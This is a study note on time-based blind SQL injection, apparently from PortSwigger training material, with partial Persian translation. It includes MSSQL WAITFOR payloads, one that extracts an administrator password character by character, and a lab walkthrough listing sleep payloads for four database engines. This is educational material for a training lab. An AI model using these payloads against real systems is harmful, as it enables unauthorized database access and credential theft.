Source: https://portswigger.net/web-security/sql-injection/blind
|   Exploiting blind SQL injection by triggering time delays
|
|   But what if the application catches these errors and handles them gracefully? 
|   اما اگر برنامه این خطاها را دریافت کند و با ظرافت با آنها برخورد کند، چه؟
|
|   In this situation, it is often possible to exploit the blind SQL injection vulnerability 
|   by triggering time delays conditionally, depending on an injected condition.
|    
|   Because SQL queries are generally processed synchronously by the application, 
|   delaying the execution of a SQL query will also delay the HTTP response. 
|   از آنجا که پرس و جوهای اس‌کیو‌ال عموماً توسط برنامه به صورت همزمان پردازش می شوند،
|   تأخیر در اجرای پرس و جوی اس‌کیو‌ال پاسخ اچ‌تی‌تی‌پی را نیز به تأخیر می اندازد.
|
|   This allows us to infer the truth of the injected condition based on the time taken 
|   before the HTTP response is received. 
|   
|   On Microsoft SQL Server, input like the following can be used 
|   to test a condition and trigger a delay depending on whether the expression is true: 
|   |
|   |==>    '; IF (1=2) WAITFOR DELAY '0:0:10'--
|   |==>    '; IF (1=1) WAITFOR DELAY '0:0:10'--
|   |
|   |____So: The first of these inputs will not trigger a delay, 
|            because the condition 1=2 is false. 
|            The second input will trigger a delay of 10 seconds, 
|            because the condition 1=1 is true. 
|
|   Using this technique, we can retrieve data in the way already described, 
|   by systematically testing one character at a time: 
|   |
|   |==>    '; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
|   |
|   |___So: Get Password by Time delaying



Lab: Blind SQL injection with time delays:
    Source: https://portswigger.net/web-security/sql-injection/blind/lab-time-delays
    
    vulnerable parameter.

    Target:
    Prove that the field is vulnerable to blind SQLi (Time Based)
    To solve the lab, exploit the SQL injection vulnerability to cause a 10 second delay. 
    
    Step 1: Burp On
    Step 2: Hint Go to  SQL injection cheat sheet.  -->  https://portswigger.net/web-security/sql-injection/cheat-sheet
    Step 3: Try each ones
    Payloads:
        Oracle -----------> dbms_pipe.receive_message(('a'),10)
        Microsoft --------> WAITFOR DELAY '0:0:10'
        PostgreSQL ------->	SELECT pg_sleep(10)
        MySQL 	----------> SELECT SLEEP(10) 
    In addition this injection code:
        ' || ()--
        ' || (dbms_pipe.receive_message(('a'),10))--
        ' || (WAITFOR DELAY '0:0:10')--
        ' || (SELECT pg_sleep(10))--
        ' || (SELECT SLEEP(10))--




Lab Source 2: https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval




